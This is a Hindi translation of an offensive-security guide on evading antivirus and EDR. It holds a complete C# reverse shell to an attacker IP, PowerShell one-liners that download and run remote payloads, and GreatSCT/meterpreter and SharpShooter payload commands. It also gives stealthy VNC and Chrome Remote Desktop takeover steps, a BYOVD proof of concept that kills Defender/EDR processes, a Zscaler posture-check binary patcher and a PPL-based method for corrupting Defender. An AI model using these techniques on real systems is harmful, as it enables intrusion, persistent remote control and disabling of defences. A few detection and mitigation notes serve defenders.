- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork देना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के जरिए software security को बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि `C++11/14` language का उपयोग करके compile time पर obfuscated code कैसे generate किया जा सकता है, बिना किसी external tool के और बिना compiler को modify किए।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generated obfuscated operations की एक layer जोड़ें, जिससे application को crack करना चाहने वाले व्यक्ति का काम थोड़ा और मुश्किल हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो .exe, .dll, .sys सहित विभिन्न अलग-अलग pe files को obfuscate करने में सक्षम है
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करके LLVM-supported languages के लिए एक fine-grained code obfuscation framework है। ROPfuscator assembly code level पर एक program को regular instructions को ROP chains में transform करके obfuscate करता है, जिससे normal control flow की हमारी natural conception बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE Crypter है, जिसे Nim में लिखा गया है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor existing EXE/DLL को shellcode में convert कर सकता है और फिर उन्हें load करता है

## SmartScreen & MoTW

आपने यह screen तब देखी होगी जब आपने internet से कुछ executables download किए हों और उन्हें execute किया हो।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को potentially malicious applications run करने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach के साथ काम करता है, यानी uncommon download applications SmartScreen को trigger करेंगे, जिससे end user को alert किया जाएगा और file execute करने से रोका जाएगा (हालांकि file को More Info -> Run anyway पर click करके फिर भी execute किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जिसका नाम Zone.Identifier है, जो internet से download की गई files के साथ automatically create होता है, साथ में वह URL भी जिससे उसे download किया गया था।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Internet से download की गई file के लिए Zone.Identifier ADS की जांच करना।</p></figcaption></figure>

> [!TIP]
> यह ध्यान देना महत्वपूर्ण है कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web से बचाने का एक बहुत प्रभावी तरीका है उन्हें ISO जैसे किसी container के अंदर package करना। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non NTFS** volumes पर apply **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है जो payloads को output containers में package करता है ताकि Mark-of-the-Web को evade किया जा सके।

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यह SmartScreen को bypass करने का एक demo है, जिसमें [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO files के अंदर payloads को package किया जाता है

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक powerful logging mechanism है जो applications और system components को **log events** करने देता है। हालांकि, इसे security products malicious activities को monitor और detect करने के लिए भी उपयोग कर सकते हैं।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को भी इस तरह बनाना possible है कि वह किसी भी event को log किए बिना तुरंत return कर दे। यह function को memory में patch करके किया जाता है ताकि वह तुरंत return करे, और उस process के लिए ETW logging effectively disable हो जाए।

आप अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** में पा सकते हैं।


## C# Assembly Reflection

C# binaries को memory में load करना काफी समय से जाना जाता है, और यह अभी भी AV के बिना अपने post-exploitation tools चलाने का एक बहुत अच्छा तरीका है।

क्योंकि payload सीधे memory में load होगा और disk को touch नहीं करेगा, हमें सिर्फ पूरे process के लिए AMSI patching की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) पहले से ही C# assemblies को सीधे memory में execute करने की capability देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process spawn** करना शामिल है, अपने post-exploitation malicious code को उस नए process में inject करना, अपने malicious code को execute करना, और जब काम पूरा हो जाए तो नए process को kill कर देना। इसके अपने फायदे और नुकसान दोनों हैं। fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होती है। इसका मतलब है कि अगर हमारी post-exploitation action में कुछ गलत हो जाए या पकड़ ली जाए, तो हमारे **implant के survive** करने की **काफी अधिक संभावना** होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **काफी अधिक संभावना** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह post-exploitation malicious code को **अपने ही process में inject** करने के बारे में है। इस तरह, आप नया process बनाने और AV द्वारा scan होने से बच सकते हैं, लेकिन नुकसान यह है कि अगर आपके payload के execution में कुछ गलत हो जाए, तो **अपने beacon को खोने** की **काफी अधिक संभावना** होती है, क्योंकि यह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो कृपया यह article देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप PowerShell से भी C# Assemblies load कर सकते हैं, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## Using Other Programming Languages

जैसा कि [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित है, compromised machine को **Attacker Controlled SMB share पर installed interpreter environment** तक access देकर other languages का उपयोग करके malicious code execute करना possible है।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised machine की memory के भीतर इन languages में **arbitrary code execute** कर सकते हैं।

repo के अनुसार: Defender अभी भी scripts को scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने के लिए अधिक flexibility** होती है। इन languages में random un-obfuscated reverse shell scripts के साथ testing सफल साबित हुई है।

## TokenStomping

Token stomping एक technique है जो attacker को **access token या EDR या AV जैसे security prouct** को **manipulate** करने देती है, जिससे वे इसकी privileges कम कर सकते हैं ताकि process मर न जाए, लेकिन उसके पास malicious activities check करने की permissions भी न हों।

इसे रोकने के लिए Windows **external processes** को security processes के tokens पर handles प्राप्त करने से **prevent** कर सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताया गया है, victim PC पर Chrome Remote Desktop deploy करना और फिर उससे takeover करना तथा persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, और फिर Windows के लिए MSI file पर click करके MSI file download करें।
2. victim पर installer silently run करें (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। wizard फिर authorization मांगेगा; जारी रखने के लिए Authorize button पर click करें।
4. दिए गए parameter को कुछ adjustments के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin param, जो GUI का उपयोग किए बिना pin set करने देता है)।


## Advanced Evasion

Evasion एक बहुत complicated topic है, कभी-कभी आपको सिर्फ एक system में कई अलग-अलग telemetry sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग impossible है।

जिस भी environment के खिलाफ आप जाते हैं, उसकी अपनी strengths और weaknesses होंगी।

मैं strongly encourage करता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) का यह talk देखें, ताकि Advanced Evasion techniques की बेहतर समझ मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह भी [@mariuszbit](https://twitter.com/mariuszbit) का Evasion in Depth पर एक और बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो **binary के हिस्सों को remove** करता जाएगा जब तक कि यह पता न चल जाए कि **Defender किस हिस्से** को malicious मान रहा है, और उसे आपको split करके दे देगा।\
इसी तरह का काम करने वाला एक और tool [**avred**](https://github.com/dobin/avred) है, जिसके साथ एक open web service [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows10 तक, सभी Windows के साथ एक **Telnet server** आता था जिसे आप (administrator के रूप में) install कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **start** करें और अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (stealth) और firewall disable करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**HOST पर**: _**winvnc.exe**_ को execute करें और server configure करें:

- विकल्प _Disable TrayIcon_ enable करें
- _VNC Password_ में एक password set करें
- _View-Only Password_ में एक password set करें

फिर, binary _**winvnc.exe**_ और **newly** created file _**UltraVNC.ini**_ को **victim** में move करें

#### **Reverse connection**

**attacker** को अपने **host** के अंदर binary `vncviewer.exe -listen 5900` execute करनी चाहिए ताकि वह reverse **VNC connection** catch करने के लिए **prepared** रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` start करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- अगर `winvnc` पहले से चल रहा है तो उसे start न करें, वरना आप [popup](https://i.imgur.com/1SROTTl.png) trigger करेंगे। `tasklist | findstr winvnc` से check करें कि यह चल रहा है या नहीं
- `UltraVNC.ini` को same directory में बिना `winvnc` start न करें, वरना [the config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- मदद के लिए `winvnc -h` न चलाएँ, वरना आप एक [popup](https://i.imgur.com/oc18wcu.png) trigger करेंगे

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **lister** को `msfconsole -r file.rc` के साथ **start** करें और **xml payload** को इस तरह **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान defender प्रक्रिया को बहुत तेज़ी से terminate कर देगा।**

### अपना खुद का reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इसके साथ compile करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors के लिए python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware गिराने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह tool अपना **vulnerable लेकिन *signed* driver** साथ लाती है और इसका abuse करके privileged kernel operations कराती है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।

Key take-aways
1. **Signed driver**: Disk पर deliver की गई file `ServiceMouse.sys` है, लेकिन binary असल में Antiy Labs के “System In-Depth Analysis Toolkit” का legitimately signed driver `AToolsKrnl64.sys` है। क्योंकि driver के पास valid Microsoft signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली line driver को **kernel service** के रूप में register करती है और दूसरी line इसे start करती है ताकि `\\.\ServiceMouse` user land से accessible हो जाए।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा arbitrary process terminate करना (Defender/EDR services को kill करने के लिए इस्तेमाल) |
| `0x990000D0` | Disk पर arbitrary file delete करना |
| `0x990001D0` | Driver unload करना और service remove करना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode protections को पूरी तरह bypass कर देता है; जो code kernel में execute होता है, वह *protected* processes को open कर सकता है, उन्हें terminate कर सकता है, या kernel objects के साथ tamper कर सकता है, चाहे PPL/PP, ELAM या अन्य hardening features हों।

Detection / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें ताकि Windows `AToolsKrnl64.sys` load करने से refuse करे।
•  नए *kernel* services की creations monitor करें और alert करें जब कोई driver world-writable directory से load हो या allow-list में present न हो।
•  custom device objects के लिए user-mode handles के बाद suspicious `DeviceIoControl` calls पर ध्यान दें।

### On-Disk Binary Patching के जरिए Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को locally apply करता है और results को दूसरे components तक पहुंचाने के लिए Windows RPC पर depend करता है। दो कमजोर design choices इसे पूरी तरह bypass करने योग्य बनाती हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को सिर्फ एक boolean भेजा जाता है)।
2. Internal RPC endpoints सिर्फ यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है या नहीं (via `WinVerifyTrust`)।

Disk पर पड़े चार signed binaries को **patch** करके दोनों mechanisms neutralize किए जा सकते हैं:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` का indirect call | NOP-ed ⇒ कोई भी (even unsigned) process RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से replace किया गया |
| `ZSATunnel.exe` | tunnel पर integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Original files ko replace karne aur service stack restart karne ke baad:

* **Sabhi** posture checks **green/compliant** dikhate hain.
* Unsigned ya modified binaries named-pipe RPC endpoints khol sakte hain (jaise `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Compromised host ko Zscaler policies ke mutabik defined internal network par unrestricted access mil jata hai.

Yeh case study dikhati hai ki kaise purely client-side trust decisions aur simple signature checks ko kuch byte patches ke saath defeat kiya ja sakta hai.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) signer/level hierarchy enforce karta hai taaki sirf equal-or-higher protected processes hi ek dusre ko tamper kar saken. Offensively, agar aap legitimately ek PPL-enabled binary launch kar sakte hain aur uske arguments control kar sakte hain, to aap benign functionality (jaise logging) ko ek constrained, PPL-backed write primitive mein convert kar sakte hain protected directories ke against jo AV/EDR use karte hain.

Process PPL ke roop mein run hone ke liye kya chahiye
- Target EXE (aur koi bhi loaded DLLs) ko PPL-capable EKU ke saath signed hona chahiye.
- Process ko CreateProcess ke saath in flags ke use karke create kiya jana chahiye: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ek compatible protection level request karna chahiye jo binary ke signer se match kare (jaise anti-malware signers ke liye `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers ke liye `PROTECTION_LEVEL_WINDOWS`). Galat levels creation par fail ho jayenge.

PP/PPL aur LSASS protection ka ek broader intro yahan bhi dekhein:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level select karta hai aur target EXE ko arguments forward karta hai):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns करता है और एक parameter स्वीकार करता है ताकि एक log file caller-specified path पर लिख सके।
- जब इसे PPL process के रूप में लॉन्च किया जाता है, तो file write PPL backing के साथ होता है।
- ClipUp spaces वाले paths parse नहीं कर सकता; सामान्य रूप से protected locations की ओर point करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names list करें: प्रत्येक parent directory में `dir /x`.
- cmd में short path derive करें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ किसी launcher (e.g., CreateProcessAsPPL) का उपयोग करके launch करें।
2) ClipUp log-path argument pass करें ताकि protected AV directory (e.g., Defender Platform) में file creation force हो। जरूरत हो तो 8.3 short names का उपयोग करें।
3) यदि target binary सामान्यतः AV द्वारा running के दौरान open/locked रहती है (e.g., MsMpEng.exe), तो AV शुरू होने से पहले boot पर write schedule करें, एक auto-start service install करके जो reliably पहले run करती है। Process Monitor (boot logging) के साथ boot ordering validate करें।
4) reboot पर PPL-backed write AV के अपने binaries lock करने से पहले हो जाती है, जिससे target file corrupt हो जाती है और startup prevent हो जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
टिप्पणियाँ और सीमाएँ
- आप ClipUp द्वारा लिखी जाने वाली सामग्री को placement के अलावा नियंत्रित नहीं कर सकते; यह primitive precise content injection की बजाय corruption के लिए उपयुक्त है।
- service install/start करने और reboot window के लिए local admin/SYSTEM चाहिए।
- timing critical है: target open नहीं होना चाहिए; boot-time execution file locks से बचाता है।

Detections
- `ClipUp.exe` का unusual arguments के साथ process creation, खासकर जब यह non-standard launchers द्वारा parented हो, boot के आसपास।
- नए services जो suspicious binaries को auto-start करने के लिए configured हों और Defender/AV से लगातार पहले start होते हों। Defender startup failures से पहले हुई service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा unexpected file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ created processes और non-AV binaries द्वारा anomalous PPL level usage देखें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन-से signed binaries PPL के रूप में और किन parents के तहत run कर सकते हैं; legitimate contexts के बाहर ClipUp invocation block करें।
- Service hygiene: auto-start services की creation/modification restrict करें और start-order manipulation monitor करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption दर्शाने वाली startup errors की जाँच करें।
- यदि आपके environment के साथ compatible हो, तो security tooling host करने वाले volumes पर 8.3 short-name generation disable करने पर विचार करें (पूरी तरह test करें)।

PPL और tooling के लिए References
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack के माध्यम से Microsoft Defender tampering

Windows Defender वह platform चुनता है जिससे वह run करेगा, इस path के अंतर्गत subfolders enumerate करके:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे उच्च lexicographic version string वाले subfolder को select करता है (जैसे, `4.18.25070.5-0`), फिर वहीं से Defender service processes शुरू करता है (service/registry paths को accordingly update करते हुए)। यह selection directory reparse points (symlinks) सहित directory entries पर trust करता है। एक administrator इसका उपयोग Defender को attacker-writable path की ओर redirect करने और DLL sideloading या service disruption हासिल करने के लिए कर सकता है।

Preconditions
- Local Administrator (Platform folder के तहत directories/symlinks बनाने के लिए आवश्यक)
